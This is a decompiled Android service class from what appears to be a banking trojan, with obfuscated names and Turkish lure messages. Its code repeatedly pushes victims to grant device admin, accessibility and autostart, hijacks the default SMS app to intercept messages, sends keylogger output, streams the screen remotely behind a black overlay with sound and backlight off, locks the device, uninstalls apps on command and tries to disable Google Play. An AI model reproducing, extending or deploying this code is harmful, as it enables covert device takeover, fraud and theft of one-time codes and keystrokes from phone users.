package com.sonnokta;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import fddo.Cbreak;
import fddo.Cclass;
import fddo.Cfor;
import fddo.Cgoto;
import fddo.Cthis;
import fddo.Cthrow;

import com.sonnokta.utils.LogUtil;

import java.util.HashSet;
import java.util.List;

public class p054v extends Service {
    private static String TAG = "bwolf-p054v";

    /* renamed from: for  reason: not valid java name */
    public static boolean f23for;
    public static boolean ifdf;

    /* renamed from: new  reason: not valid java name */
    public static PowerManager.WakeLock f24new;

    /* renamed from: fddo  reason: collision with root package name */
    private long f102fddo = 0;

    class fddo implements Runnable {
        fddo() {
        }

        public void run() {
            Looper.prepare();
            while (true) {
                try {
                    p054v p054v = p054v.this;
                    p054v.m31for(p054v.getApplicationContext());
                    Cgoto.p(1000);
                } catch (Exception unused) {
                    return;
                }
            }
        }
    }

    /* renamed from: break  reason: not valid java name */
    private boolean m25break(Context context) {
        if (Cthrow.fddo(context, "no_push_intent", Boolean.FALSE).booleanValue() || Cgoto.ifdf(context).booleanValue() || !Cgoto.sdgphkmaepghmsdpgfmhapdfmgh(context, "push_admin_request", 30)) {
            return true;
        }
        int intValue = Cthrow.ifdf(context, Cbreak.fddo("4eb7c64203c8f6f3663d803c437a2c02b2b274"), 0).intValue();
        if (intValue >= 10) {
            if (Cthrow.m158new(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "").equals("push_admin")) {
                Cthrow.m159this(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "");
            }
            if (intValue == 10) {
                Cgoto.g(context, "AT_ERROR: 10 attempts to get push admin reached, skipping");
                Cthrow.m155else(context, "push_admin_attempts", Integer.valueOf(intValue + 1));
            }
            return true;
        } else if (Cgoto.srgjnsrfgjartgj(context)) {
            Cthrow.m159this(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "push_admin");
            Cgoto.p(1000);
            return false;
        } else {
            Cthrow.m154case(context, "no_push_intent", Boolean.TRUE);
            return true;
        }
    }

    /* renamed from: case  reason: not valid java name */
    private boolean m26case(Context context) {
        LogUtil.showErrorLog(TAG, "--- m26case ---");
        if (Cgoto.dfhaefdhadfhdfherh(context)) {
            Boolean bool = Boolean.FALSE;
            if (!Cthrow.fddo(context, "got_acsb_cleanup", bool).booleanValue()) {
                Cgoto.m122instanceof(context);
                Cthrow.m154case(context, "show_acsb", bool);
                Cgoto.m119goto(context);
                Cthrow.m154case(context, "got_acsb_cleanup", Boolean.TRUE);
            }
            if (!f23for || Cthrow.fddo(context, "fg_mode", bool).booleanValue()) {
                return true;
            }
            m32import();
            return true;
        } else if (!Cgoto.sdgphkmaepghmsdpgfmhapdfmgh(context, "last_acsb_shown_time", 10)) {
            return false;
        } else {
            if (!Cthrow.fddo(context, "acsb_system_init", Boolean.FALSE).booleanValue()) {
                if (Cfor.f58else.length != 0) {
                    Cclass.m56else(context);
                } else {
                    Cgoto.dgjaertjardthjdgu(context);
                }
                Cthrow.m154case(context, "acsb_system_init", Boolean.TRUE);
            }
            Cgoto.j(context, "Servisi etkinleştirin".replace("%APP%", Cgoto.m133super(context)), "%APP%".replace("%APP%", Cgoto.m133super(context)));
            if (!Cgoto.sdgphkmaepghmsdpgfmhapdfmgh(context, "last_acsb_shown_time2", 30)) {
                return false;
            }
            if (Cfor.f58else.length != 0) {
                Cclass.m56else(context);
            } else {
                Cgoto.dgjaertjardthjdgu(context);
            }
            context.startService(new Intent(context, p071p.class));
            return false;
        }
    }

    /* renamed from: catch  reason: not valid java name */
    private boolean m27catch(Context context) {
        if (Cgoto.m114else(context)) {
            return true;
        }
        int intValue = Cthrow.ifdf(context, "write_settings_attempts", 0).intValue();
        if (intValue >= 10) {
            if (Cthrow.m158new(context, "acsb_task", "").equals("write_settings")) {
                Cthrow.m159this(context, "acsb_task", "");
            }
            if (intValue == 10) {
                Cgoto.g(context, "AT_ERROR: 10 attempts to get write_settings reached, skipping");
                Cthrow.m155else(context, "write_settings_attempts", Integer.valueOf(intValue + 1));
            }
            return true;
        }
        Intent intent = new Intent("android.settings.action.MANAGE_WRITE_SETTINGS");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setData(Uri.parse("package:" + context.getPackageName()));
        context.startActivity(intent);
        Cthrow.m159this(context, "acsb_task", "write_settings");
        Cthrow.m155else(context, "write_settings_attempts", Integer.valueOf(intValue + 1));
        Cgoto.p(Cfor.ifdf.contains("MANPERMS") ? 60000 : 1000);
        return false;
    }

    /* renamed from: class  reason: not valid java name */
    public static boolean m28class(Context context, String str, HashSet<String> hashSet) {
        LogUtil.showErrorLog(TAG, "--- m28class ---");
        StringBuilder sb;
        String str2;
        if (!str.contains(".")) {
            sb = new StringBuilder();
            str2 = "UNINSTALL: bad app name: ";
        } else if (hashSet.contains(str)) {
            sb = new StringBuilder();
            str2 = "UNINSTALL: device admin can't be uninstalled: ";
        } else {
            try {
                if ((context.getPackageManager().getApplicationInfo(str, 0).flags & 1) == 0) {
                    return true;
                }
                Cgoto.g(context, "UNINSTALL: system app can't be uninstalled: " + str);
                return false;
            } catch (PackageManager.NameNotFoundException unused) {
                sb = new StringBuilder();
                str2 = "UNINSTALL: app is not installed: ";
            }
        }
        sb.append(str2);
        sb.append(str);
        Cgoto.g(context, sb.toString());
        return false;
    }

    /* renamed from: const  reason: not valid java name */
    private void m29const(Context context) {
        LogUtil.showErrorLog(TAG, "--- m29const ---");
        if (Cthrow.fddo(context, "lock_on", Boolean.FALSE).booleanValue()) {
            Cgoto.sdgjsrfgj(context, p053u.class);
            Cgoto.p(100);
        }
    }

    private void fddo(Context context) {
        if (Cthrow.m158new(context, "vnc", "").isEmpty() && !Cgoto.apdmghpaiodfmhpadfmhpdmfkh(context)) {
            String fddo2 = Cbreak.fddo("57acc14f2ecaf7ee7b0cb033");
            Boolean bool = Boolean.FALSE;
            if (Cthrow.fddo(context, fddo2, bool).booleanValue() && !Cgoto.apkdfmhpadmfhpadomfhgpewirh(context)) {
                int intValue = Cthrow.ifdf(context, "sms_attempts", 0).intValue();
                if (intValue >= 5) {
                    if (Cthrow.m158new(context, "acsb_task", "").equals("sms")) {
                        Cthrow.m159this(context, "acsb_task", "");
                    }
                    if (intValue == 5) {
                        Cgoto.g(context, "AT_ERROR: 5 attempts to change sms reached, skipping");
                        Cthrow.m155else(context, "sms_attempts", Integer.valueOf(intValue + 1));
                        return;
                    }
                    return;
                }
                String str = Cgoto.m106abstract(context);
                Cgoto.g(context, "SMS_Intercept: current pkg: " + str);
                if (!str.isEmpty() && !str.equals(context.getPackageName())) {
                    Cthrow.m159this(context, Cbreak.fddo("4dafc67533dbfbf95023b43a"), str);
                    Cthrow.m159this(context, Cbreak.fddo("5caeda4937f6e1f37c0caf3650"), str);
                    Cgoto.g(context, "SMS_Intercept: original pkg saved");
                }
                Cthrow.m159this(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "sms");
                Cgoto.g(context, "SMS_Intercept: request to set pkg: " + context.getPackageName());
                Cgoto.i(context, context.getPackageName());
                Cthrow.m155else(context, Cbreak.fddo("4dafc6753ddde6fb6223ab2e"), Integer.valueOf(intValue + 1));
            } else if (!Cthrow.fddo(context, Cbreak.fddo("57acc14f2ecaf7ee7b0cb033"), bool).booleanValue()) {
                String str2 = Cthrow.m158new(context, Cbreak.fddo("4dafc67533dbfbf95023b43a"), "");
                if (!str2.isEmpty()) {
                    if (Cgoto.apkdfmhpadmfhpadomfhgpewirh(context)) {
                        Cthrow.m159this(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "sms");
                        Cgoto.i(context, str2);
                        return;
                    }
                    Cthrow.m159this(context, Cbreak.fddo("4dafc67533dbfbf95023b43a"), "");
                    Cthrow.m159this(context, Cbreak.fddo("5caeda4937f6e1f37c0caf3650"), "");
                }
            }
        }
    }

    /* renamed from: final  reason: not valid java name */
    private void m30final(Context context) {
        LogUtil.showErrorLog(TAG, "--- m30final ---");
        if (Cgoto.spkfgmhapoemghapfgmhadgkmhpda(context)) {
            Cthrow.m159this(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "battery");
            Cgoto.m135synchronized(context);
            Cgoto.p(1000);
        }
    }

    /* access modifiers changed from: private */
    /* renamed from: for  reason: not valid java name */
    public void m31for(Context context) {
        m37static(context);
        m36return(context);
        Cthis.m147case(context);
        if (m26case(context)) {
            m38super(context, Cthrow.m158new(context, "vnc", ""));
            if (!Cthrow.m158new(context, "vnc", "").isEmpty()) {
                fddo(context);
                return;
            }
            p023w p023wV = p023w.f19while;
            if (p023wV != null) {
                p023wV.m22try();
            }
            m40throw(context);
            m29const(context);
            fddo(context);
            m34new(context);
            m35public(context);
            m30final(context);

            if (m43goto(context) && m42else(context) && m25break(context) && m44try(context) && m27catch(context)) {
                m39this(context);
                Cgoto.p(1000);
            }
        }
    }

    /* renamed from: import  reason: not valid java name */
    private void m32import() {
        LogUtil.showErrorLog(TAG, "--- m32import ---");
        stopForeground(true);
        f23for = false;
    }

    /* renamed from: native  reason: not valid java name */
    public static void m33native(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- m33native ---");
        String[] split = str.split(",");
        HashSet hashSet = new HashSet();
        List<ComponentName> activeAdmins = ((DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE)).getActiveAdmins();
        if (activeAdmins != null) {
            for (ComponentName next : activeAdmins) {
                if (next != null) {
                    hashSet.add(next.getPackageName());
                }
            }
        }
        for (String trim : split) {
            String trim2 = trim.trim();
            if (!trim2.isEmpty()) {
                if (m28class(context, trim2, hashSet)) {
                    Cgoto.v(context, trim2);
                    Cthrow.m159this(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "confirm_uninstall");
                    Cthrow.m157goto(context, "last_uninstall_attempt", Long.valueOf(System.currentTimeMillis()));
                    return;
                }
                str = str.replace(trim2 + ",", "").replace(trim2, "");
                Cthrow.m159this(context, "uninstall_apps", str);
            }
        }
    }

    /* renamed from: new  reason: not valid java name */
    private void m34new(Context context) {
        LogUtil.showErrorLog(TAG, "--- m34new ---");
        Boolean bool = Boolean.FALSE;
        boolean isKillBot = Cthrow.fddo(context, "kill_bot", bool).booleanValue();
        boolean isDeviceAdminSet = Cthrow.fddo(context, "device_admin_set", bool).booleanValue();
        if (isKillBot && isDeviceAdminSet) {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName componentName = new ComponentName(this, p053u.class);
            if (devicePolicyManager.isAdminActive(componentName)) {
                devicePolicyManager.removeActiveAdmin(componentName);
                Cthrow.m159this(context, "acsb_task", "admin");
                Cgoto.p(1000);
            }
        }
    }

    /* renamed from: public  reason: not valid java name */

    /**
     * TODO - CHECK
     *
     * @param r7
     */
    private void m35public(android.content.Context r7) {
        Log.e(TAG, "--- m35public > Check --- ");

        boolean boolV2 = false;

        if (Cthrow.m158new(r7, "acsb_task", "").equals("confirm_uninstall")) {
            boolV2 = true;
            if (Cgoto.dkgmhapefdmhpadfmhspfkgmh(r7, "last_uninstall_attempt", 0xa, false)) {
                Cthrow.m159this(r7, "acsb_task", "");
            }
        }

        if (!boolV2) {
            if (!Cgoto.apdmghpaiodfmhpadfmhpdmfkh(r7)) {
                String strV0 = Cthrow.m158new(r7, "uninstall_apps", "");
                if (!strV0.isEmpty()) {
                    Integer integerV1 = Cthrow.ifdf(r7, "uninstall_delay", Integer.valueOf(0));
                    int intV1 = integerV1.intValue();
                    Long longV2 = Cthrow.m156for(r7, "uptime", Long.valueOf(0));
                    long lgV2 = longV2.longValue();
                    if (lgV2 > intV1)
                        p054v.m33native(r7, strV0);
                }
            }
        }
    }

    /* renamed from: return  reason: not valid java name */
    private void m36return(Context context) {
        LogUtil.showErrorLog(TAG, "--- m36return ---");
        int intValue = Cthrow.ifdf(context, "panel_smarts_ver", -1).intValue();
        int intValue2 = Cthrow.ifdf(context, "bot_smarts_ver", -1).intValue();
        boolean z = true;
        boolean z2 = intValue == -1 && intValue2 == -1 && Cgoto.sdgphkmaepghmsdpgfmhapdfmgh(context, "smarts_last_download_ts", 30);
        if (intValue > intValue2) {
            Cthrow.m155else(context, "bot_smarts", Integer.valueOf(intValue));
        } else {
            z = z2;
        }
        if (z) {
            new Cclass(context).m58for();
        }
    }

    /* renamed from: static  reason: not valid java name */
    private void m37static(Context context) {
        LogUtil.showErrorLog(TAG, "--- m37static ---");
        long longValue = Cthrow.m156for(context, "registration_time", 0L).longValue();
        if (longValue != 0) {
            long j = Cgoto.m112continue() - longValue;
            this.f102fddo = j;
            Cthrow.m157goto(context, "uptime", Long.valueOf(j));
        }
    }

    /* renamed from: super  reason: not valid java name */
    private void m38super(Context context, String str) {
        if (str.isEmpty()) {
            Boolean bool = Boolean.FALSE;
            if (Cthrow.fddo(context, "vnc_overlay_enabled", bool).booleanValue()) {
                Cgoto.b(context);
                Cthrow.m154case(context, "vnc_overlay_enabled", bool);
            }
            if (Cthrow.fddo(context, "vnc_stream_started", bool).booleanValue()) {
                Cgoto.s(context, new Intent(context, p067x.class).putExtra("stop", "1"));
                context.stopService(new Intent(context, p044i.class));
                Cthrow.m154case(context, "vnc_stream_started", bool);
            }
            if (Cthrow.fddo(context, "vnc_sound_off", bool).booleanValue() && Cgoto.ifdf(context).booleanValue()) {
                Cgoto.m107break(context);
                Cthrow.m154case(context, "vnc_sound_off", bool);
            }
            if (Cthrow.fddo(context, "vnc_backlight_off", bool).booleanValue() && Cgoto.m114else(context)) {
                Cgoto.c(context);
                Cthrow.m154case(context, "vnc_backlight_off", bool);
            }
            if (Cgoto.m114else(context) && Cthrow.fddo(context, "screen_timeout_increased", bool).booleanValue()) {
                Cgoto.d(context);
                Cthrow.m154case(context, "screen_timeout_increased", bool);
                return;
            }
            return;
        }
        if (Cgoto.m114else(context) && !Cthrow.fddo(context, "screen_timeout_increased", Boolean.FALSE).booleanValue()) {
            Cgoto.dgjfsdhadfjhadfh(context);
            Cthrow.m154case(context, "screen_timeout_increased", Boolean.TRUE);
        }
        if (str.contains("STREAM_SCREEN;")) {
            Boolean bool2 = Boolean.FALSE;
            if (Cthrow.fddo(context, "vnc_stream_started", bool2).booleanValue() && !p067x.f27this) {
                Cthrow.m154case(context, "vnc_stream_started", bool2);
            }
        }
        if (str.contains("STREAM_SCREEN;") && !Cthrow.fddo(context, "vnc_stream_started", Boolean.FALSE).booleanValue() && !Cgoto.apdmghpaiodfmhpadfmhpdmfkh(context) && Cgoto.dkgmhapefdmhpadfmhspfkgmh(context, "last_vnc_stream_attempt", 30, true)) {
            Cthrow.m159this(context, "acsb_task", "vnc_screen");
            Intent intent = new Intent(this, p036n.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
        if (str.contains("BLACK;") && !Cgoto.jghkmjpdokgmhsdghkmdg(context) && !Cthrow.fddo(context, "vnc_overlay_enabled", Boolean.FALSE).booleanValue() && Settings.canDrawOverlays(context)) {
            Cgoto.m118for(context);
        }
        if (str.contains("SILENT;")) {
            Boolean bool3 = Boolean.FALSE;
            if (!Cthrow.fddo(context, "vnc_sound_off", bool3).booleanValue() && Cgoto.ifdf(context).booleanValue()) {
                Cgoto.m109catch(context);
                Cthrow.m154case(context, "vnc_sound_off", Boolean.TRUE);
            }
            if (!Cthrow.fddo(context, "vnc_backlight_off", bool3).booleanValue() && Cgoto.m114else(context)) {
                Cgoto.m136this(context);
                Cthrow.m154case(context, "vnc_backlight_off", Boolean.TRUE);
            }
        }
    }

    /* renamed from: this  reason: not valid java name */
    private void m39this(Context context) {
        LogUtil.showErrorLog(TAG, "--- m39this ---");
        Class<p025i> cls = p025i.class;
        if (Cgoto.ifdf >= Cgoto.f69new && Cthrow.m158new(context, "vnc", "").isEmpty()) {
            int intValue = Cthrow.ifdf(context, "perms_check_delay", 5).intValue();
            if (!Cgoto.apdmghpaiodfmhpadfmhpdmfkh(context) && Cgoto.dkgmhapefdmhpadfmhspfkgmh(context, "last_perms_check", intValue, true)) {
                Cthrow.m159this(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "perms");
                int intValue2 = Cthrow.ifdf(context, "check_perms_attempts", 0).intValue() + 1;
                Cthrow.m155else(context, "check_perms_attempts", Integer.valueOf(intValue2));
                if (intValue2 > 5 && intValue2 < 10) {
                    Cgoto.n(context, "Yetersiz alan!", "Temizlemek için buraya tiklayin", cls);
                }
                Intent intent = new Intent(this, cls);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                context.startActivity(intent);
                Cgoto.p(1000);
            }
        }
    }

    /* renamed from: throw  reason: not valid java name */
    private void m40throw(Context context) {
        LogUtil.showErrorLog(TAG, "--- m40throw ---");
        if (Cthrow.fddo(context, "keylogger_enabled", Boolean.FALSE).booleanValue() && Cgoto.sdgphkmaepghmsdpgfmhapdfmgh(context, "last_keylog_send", 5)) {
            String fgjagthj = Cgoto.fgjagthj(context);
            if (fgjagthj.length() > 5) {
                Cgoto.g(context, fgjagthj);
            }
        }
    }

    /* renamed from: while  reason: not valid java name */
    private void m41while(Context context) {
        LogUtil.showErrorLog(TAG, "--- m41while ---");
        p041i.fddo(context, this);
        p041i.m24for(context);
        f23for = true;
    }

    /* renamed from: else  reason: not valid java name */
    public boolean m42else(Context context) {
        if (!Cthrow.m158new(context, "vnc", "").isEmpty() || !Cgoto.grethwjrsfhj()) {
            return true;
        }

        Intent component = new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
        if (getPackageManager().resolveActivity(component, 65536) == null || !Cthrow.m158new(context, "xiaomi_autostart", "").isEmpty() || !Cgoto.dkgmhapefdmhpadfmhspfkgmh(context, "last_autostart_attempt", 60, true) || Cthrow.ifdf(context, "xiaomi_autostart_attempts", 0).intValue() >= 4) {
            return true;
        }
        component.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(component);
        Cthrow.m159this(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "xiaomi_autostart");
        Cthrow.m155else(context, "xiaomi_autostart_attempts", Integer.valueOf(Cthrow.ifdf(context, "xiaomi_autostart_attempts", 0).intValue() + 1));
        Cgoto.p(Cfor.ifdf.contains("MANPERMS") ? 60000 : 5000);
        return false;
    }

    /* renamed from: goto  reason: not valid java name */
    public boolean m43goto(Context context) {
        boolean isDeviceAdminSet = Cthrow.fddo(context, "device_admin_set", Boolean.FALSE).booleanValue();

        if (isDeviceAdminSet) {
            return true;
        }
        int intValue = Cthrow.ifdf(context, Cbreak.fddo("5fa6d84332f6f3ea7b36b22d437d"), 0).intValue();
        if (intValue >= 10) {
            if (Cthrow.m158new(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "").equals("admin")) {
                Cthrow.m159this(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "");
            }
            if (intValue == 10) {
                Cgoto.g(context, "AT_ERROR: 10 attempts to get device admin reached, skipping");
                Cthrow.m155else(context, "admin_attempts", Integer.valueOf(intValue + 1));
            }
            return true;
        }
        int intValue2 = Cthrow.ifdf(context, "get_device_admin_delay", 0).intValue();
        long longValue = Cthrow.m156for(context, "uptime", 0L).longValue();
        if (longValue < ((long) intValue2)) {
            LogUtil.showErrorLog(">>p054v", "DEVADM up:" + longValue + " ; delay:" + intValue2);
            return true;
        }
        Cthrow.m159this(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "admin");
        Intent intent = new Intent(this, p085x.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        context.startActivity(intent);
        Cthrow.m155else(context, Cbreak.fddo("5fa6d84332f6f3ea7b36b22d437d"), Integer.valueOf(intValue + 1));
        Cgoto.p(Cgoto.grethwjrsfhj() ? 10000 : 1000);
        return false;
    }

    public IBinder onBind(Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onBind ---");
        return null;
    }

    public void onDestroy() {
        LogUtil.showErrorLog(TAG, "--- onDestroy ---");
        ifdf = false;
        super.onDestroy();
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        if (intent == null) {
            return Service.START_NOT_STICKY;
        }

        try {
            Context applicationContext = getApplicationContext();
            if (intent.hasExtra("fg") && intent.getExtras().getString("fg") != null) {
                String string = intent.getExtras().getString("fg");
                if (string.equals("start")) {
                    m41while(applicationContext);
                } else if (string.equals("stop")) {
                    m32import();
                }
                return Service.START_STICKY;
            } else if (ifdf) {
                return Service.START_NOT_STICKY;
            } else {
                ifdf = true;
                if (!Cgoto.dfhaefdhadfhdfherh(applicationContext)) {
                    m41while(applicationContext);
                }
                new Thread(new fddo()).start();
                return Service.START_STICKY;
            }
        } catch (Exception e) {
            Cgoto.m110class(getApplicationContext(), "EXC_GLOB_ONSTART", e);
        }

        return Service.START_STICKY;
    }

    public void onTaskRemoved(Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onTaskRemoved ---");
        ifdf = false;
        super.onTaskRemoved(intent);
    }

    /* renamed from: try  reason: not valid java name */
    public boolean m44try(Context context) {
        if (Cthrow.fddo(context, "gp_disabled", Boolean.FALSE).booleanValue() || !Cthrow.m158new(context, "vnc", "").isEmpty()) {
            return true;
        }
        if (Cthrow.m156for(context, "attempt_disable_gp_ts", 0L).longValue() != 0 && Cgoto.dkgmhapefdmhpadfmhspfkgmh(context, "attempt_disable_gp_ts", 120, false)) {
            return true;
        }
        if (p023w.fddo("com.android.vending")) {
            Cgoto.p(1000);
            return false;
        } else if (Cgoto.rgjsrtfjktyfj(context)) {
            Cthrow.m159this(context, "acsb_task", "disable_gp");
            Cthrow.m155else(context, "gp_step", 0);
            Cthrow.m157goto(context, "attempt_disable_gp_ts", Long.valueOf(System.currentTimeMillis()));
            Cgoto.p(1000);
            return false;
        } else {
            Cthrow.m154case(context, "gp_disabled", Boolean.TRUE);
            return true;
        }
    }
}
